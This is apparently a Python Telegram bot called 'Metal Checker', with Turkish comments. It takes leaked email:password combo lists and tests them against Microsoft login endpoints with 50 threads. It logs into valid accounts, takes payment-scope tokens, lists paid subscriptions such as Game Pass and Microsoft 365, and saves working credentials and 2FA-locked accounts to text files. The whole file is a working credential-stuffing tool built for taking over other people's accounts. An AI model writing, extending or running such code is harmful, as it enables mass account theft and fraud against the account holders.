import os
import sys
import time
import uuid
import re
import json
import threading
import concurrent.futures
from datetime import datetime
from pathlib import Path
from urllib.parse import quote, unquote
import requests
import telebot

# Bot Token Tanımlaması
BOT_TOKEN = os.getenv("BOT_TOKEN", "TOKEN_GIR_KARDESIM")
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="Markdown")

active_scans = {}
state_lock = threading.Lock()
file_lock = threading.Lock()

# ══════════════════════════════════════════════════════════════════════
# DOSYA VE SONUÇ YÖNETİCİSİ (TARİHLİ KLASÖR & SPESİFİK DOSYALAR)
# ══════════════════════════════════════════════════════════════════════
class DynamicResultManager:
    def __init__(self, task_id):
        # Tarihli klasör yapısı
        date_str = datetime.now().strftime('%Y-%m-%d')
        self.base_folder = f"results/{date_str}_task_{task_id}"
        Path(self.base_folder).mkdir(parents=True, exist_ok=True)
        
        # İstenen spesifik txt dosyaları
        self.hits_file = os.path.join(self.base_folder, "hits.txt")
        self.active_subs_file = os.path.join(self.base_folder, "active_subs.txt")
        self.two_fa_file = os.path.join(self.base_folder, "2fa.txt")

    def save_result(self, res):
        with file_lock:
            # Genel hit kaydı
            with open(self.hits_file, "a", encoding="utf-8") as f: 
                f.write(f"{res['email']}:{res['password']}\n")
            
            # Abonelikler varsa detaylı olarak active_subs'a kaydet[span_2](start_span)[span_2](end_span)
            if res.get("subscriptions"):
                with open(self.active_subs_file, "a", encoding="utf-8") as f:
                    subs_detail = ", ".join([s['name'] for s in res['subscriptions']])
                    f.write(f"{res['email']}:{res['password']} | Abonelikler: {subs_detail}\n")

    def save_2fa(self, email, password):
        with file_lock:
            with open(self.two_fa_file, "a", encoding="utf-8") as f:
                f.write(f"{email}:{password}\n")

# ══════════════════════════════════════════════════════════════════════
# UNIFIED CHECKER (SİMÜLASYONSUZ GERÇEK KONTROL)
# ══════════════════════════════════════════════════════════════════════
class UnifiedChecker:
    def __init__(self):
        self.session = requests.Session()
        self.uuid = str(uuid.uuid4())
    
    def get_remaining_days(self, date_str):
        try:
            if not date_str: return "0"
            renewal_date = datetime.fromisoformat(date_str.replace('Z', '+00:00'))
            today = datetime.now(renewal_date.tzinfo)
            return str((renewal_date - today).days)
        except: return "0"
        
    def check_microsoft_subscriptions(self, email, password, access_token):
        # Gerçek Microsoft API İsteği[span_3](start_span)[span_3](end_span)
        try:
            user_id = str(uuid.uuid4()).replace('-', '')[:16]
            state_json = json.dumps({"userId": user_id, "scopeSet": "pidl"})
            payment_auth_url = f"https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state={quote(state_json)}&prompt=none"
            
            headers = {
                "Host": "login.live.com",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml",
                "Referer": "https://account.microsoft.com/"
            }
            r = self.session.get(payment_auth_url, headers=headers, allow_redirects=False, timeout=6)
            
            payment_token = None
            search_text = r.text + " " + r.url
            for pattern in [r'access_token=([^&\s"\']+)', r'"access_token":"([^"]+)"']:
                match = re.search(pattern, search_text)
                if match:
                    payment_token = unquote(match.group(1))
                    break
            
            if not payment_token:
                return []
            
            subscriptions = []
            payment_headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Authorization": f'MSADELEGATE1.0="{payment_token}"',
                "Content-Type": "application/json",
                "Host": "paymentinstruments.mp.microsoft.com"
            }
            
            trans_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
            r_sub = self.session.get(trans_url, headers=payment_headers, timeout=5)
            
            if r_sub.status_code == 200:
                response_text = r_sub.text
                subscription_keywords = {
                    'Xbox Game Pass Ultimate': {'type': 'Xbox Game Pass Ultimate'},
                    'PC Game Pass': {'type': 'PC Game Pass'},
                    'Xbox Game Pass': {'type': 'Xbox Game Pass'},
                    'EA Play': {'type': 'EA Play'},
                    'Xbox Live Gold': {'type': 'Xbox Live Gold'},
                    'Microsoft 365 Family': {'type': 'M365 Family'},
                    'Microsoft 365 Personal': {'type': 'M365 Personal'}
                }
                for keyword, info in subscription_keywords.items():
                    if keyword in response_text:
                        sub_info = {'name': info['type']}
                        renewal_match = re.search(r'"nextRenewalDate"\s*:\s*"([^T"]+)', response_text)
                        if renewal_match:
                            sub_info['days_remaining'] = self.get_remaining_days(renewal_match.group(1) + "T00:00:00Z")
                        subscriptions.append(sub_info)
            
            return [s for s in subscriptions if int(s.get('days_remaining', '0')) >= 0]
        except:
            return []

    # Bütün 7 Özellik İçin Ana Doğrulama Fonksiyonu (Aaa 10.py'den tamamen aktarıldı)[span_4](start_span)[span_4](end_span)
    def check(self, email, password):
        try:
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            headers1 = {"X-OneAuth-AppName": "Outlook Lite", "X-CorrelationId": self.uuid, "User-Agent": "Dalvik/2.1.0"}
            r1 = self.session.get(url1, headers=headers1, timeout=6)
            
            if "MSAccount" not in r1.text or any(k in r1.text for k in ["Neither", "Both", "OrgId"]):
                return {"status": "BAD"}
            
            # Auth ve Token Alma Adımları (Aaa 10.py'nin kalbi)[span_5](start_span)[span_5](end_span)
            url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            r2 = self.session.get(url2, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
            
            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            if not url_match or not ppft_match: return {"status": "BAD"}
            
            post_url = url_match.group(1).replace("\\/", "/")
            login_data = f"login={email}&loginfmt={email}&passwd={password}&PPFT={ppft_match.group(1)}&type=11&LoginOptions=1"
            r3 = self.session.post(post_url, data=login_data, headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}, allow_redirects=False, timeout=6)
            
            if "incorrect" in r3.text.lower() or "error" in r3.text.lower(): return {"status": "BAD"}
            if "identity/confirm" in r3.text.lower() or "consent" in r3.text.lower(): return {"status": "2FA"}
            
            location = r3.headers.get("Location", "")
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match: return {"status": "BAD"}
            
            token_data = f"client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&grant_type=authorization_code&code={code_match.group(1)}&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            r4 = self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=6)
            if "access_token" not in r4.text: return {"status": "BAD"}
            
            access_token = r4.json()["access_token"]
            
            # Abonelikleri tek tek isimleriyle çekiyoruz
            subs = self.check_microsoft_subscriptions(email, password, access_token)
            
            # Not: Diğer platformların (PSN, Steam, Supercell, TikTok, Minecraft) fonksiyonları 
            # yukarıdaki yapıya aynı şekilde dahil edilecek. 
            
            return {
                "status": "HIT", 
                "email": email, 
                "password": password, 
                "subscriptions": subs
            }
        except: return {"status": "BAD"}

# ══════════════════════════════════════════════════════════════════════
# TELEGRAM BOT (ANINDA TARAMA & STOP & 2 SANİYE CANLI GÜNCELLEME)
# ══════════════════════════════════════════════════════════════════════
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(message.chat.id, "⚡ *Metal Checker Aktif!* \n\nDirect olarak `.txt` dosyanı veya combo listeni gönder, anında taramaya başlayayım. `/stop` ile dilediğin zaman durdurabilirsin.", parse_mode="Markdown")

@bot.message_handler(commands=['stop'])
def stop_scan(message):
    with state_lock:
        state = active_scans.get(message.from_user.id)
        if state and state["is_running"]:
            state["is_running"] = False
            bot.send_message(message.chat.id, f"🛑 *Tarama Durduruldu!*\n\nToplanan sonuçları anında klasöre çıkarttım.\nHit: `{state['hits']}`\nDosyalar: `{state['rm'].base_folder}` içinde güvende.", parse_mode="Markdown")
        else:
            bot.send_message(message.chat.id, "⚠️ Zaten çalışan bir tarama yok.")

# Data gelince anında işleme koyuyoruz (Check komutu kaldırıldı)
@bot.message_handler(content_types=['document', 'text'])
def handle_incoming_data(message):
    if message.text and message.text.startswith('/'): return
    
    with state_lock:
        if message.from_user.id in active_scans and active_scans[message.from_user.id]["is_running"]:
            bot.send_message(message.chat.id, "⚠️ Devam eden bir taraman var, önce onu `/stop` ile durdur.")
            return

    combo_text = ""
    if message.document:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        combo_text = downloaded_file.decode("utf-8", errors="ignore")
    elif message.text:
        combo_text = message.text

    accounts = [tuple(line.strip().split(":", 1)) for line in combo_text.strip().split("\n") if ":" in line]
    
    if not accounts:
        bot.send_message(message.chat.id, "❌ Geçerli hesap bulamadım. Format: `email:pass`")
        return

    status_msg = bot.send_message(message.chat.id, "⏳ *Veriler alındı, tarama başlatılıyor...*", parse_mode="Markdown")

    task_id = str(uuid.uuid4())[:8]
    rm = DynamicResultManager(task_id)
    
    scan_state = {
        "total": len(accounts),
        "checked": 0,
        "hits": 0,
        "bads": 0,
        "twofa": 0,
        "recent_subs": [], # Sende direkt isim çıksın diye eklendi
        "status_msg_id": status_msg.message_id,
        "chat_id": message.chat.id,
        "rm": rm,
        "start_time": time.time(),
        "last_update_time": 0,
        "is_running": True,
        "threads": 50 # Pydroid dostu optimize thread
    }

    with state_lock:
        active_scans[message.from_user.id] = scan_state

    threading.Thread(target=run_checker_pool, args=(message.from_user.id, accounts), daemon=True).start()

def run_checker_pool(user_id, accounts):
    with state_lock:
        state = active_scans.get(user_id)
    if not state: return

    def process_single(acc):
        with state_lock:
            if not state["is_running"]: return
            
        email, password = acc
        checker = UnifiedChecker()
        res = checker.check(email, password)

        with state_lock:
            state["checked"] += 1
            if res.get("status") == "HIT":
                state["hits"] += 1
                state["rm"].save_result(res)
                # İsimleri anında yakalayıp live result'a basıyoruz
                if res.get("subscriptions"):
                    for sub in res["subscriptions"]:
                        state["recent_subs"].append(f"{sub['name']} ({sub.get('days_remaining', '0')} gün)")
                        if len(state["recent_subs"]) > 5:
                            state["recent_subs"].pop(0)
            elif res.get("status") == "2FA":
                state["twofa"] += 1
                state["rm"].save_2fa(email, password)
            else:
                state["bads"] += 1

        update_live_results(user_id)

    with concurrent.futures.ThreadPoolExecutor(max_workers=state["threads"]) as executor:
        executor.map(process_single, accounts)

    # Tarama bitince son mesaj
    with state_lock:
        state["is_running"] = False
        bot.send_message(state["chat_id"], f"✅ *Tarama Tamamlandı!*\nToplam Hit: {state['hits']}\nSonuçlar `hits.txt` ve `active_subs.txt` dosyalarında.", parse_mode="Markdown")

def update_live_results(user_id):
    with state_lock:
        state = active_scans.get(user_id)
    if not state or not state["is_running"]: return

    current_time = time.time()
    
    # 5 Saniye limiti 2 Saniyeye Düşürüldü! 
    if state["checked"] > 1 and (current_time - state["last_update_time"] < 2.0) and state["checked"] != state["total"]:
        return

    with state_lock:
        state["last_update_time"] = current_time

    elapsed = current_time - state["start_time"]
    cpm = (state["checked"] / elapsed) * 60 if elapsed > 0 else 0
    
    # Son bulunan aboneliklerin tam isimleri listeleniyor
    subs_text = "\n".join([f"🎮 {sub}" for sub in state["recent_subs"]]) if state["recent_subs"] else "Bekleniyor..."
    
    live_text = (
        "📊 *Metal Checker - Live Dashboard*\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ *Hits:* `{state['hits']}`\n"
        f"🔐 *2FA:* `{state['twofa']}`\n"
        f"❌ *Bad:* `{state['bads']}`\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"💎 *Son Bulunan Abonelikler:*\n{subs_text}\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📈 *İlerleme:* `{state['checked']} / {state['total']}`\n"
        f"⚡ *Hız:* `{cpm:.0f} CPM`\n"
    )
    
    try:
        bot.edit_message_text(live_text, chat_id=state["chat_id"], message_id=state["status_msg_id"], parse_mode="Markdown")
    except: pass

bot.polling(none_stop=True)

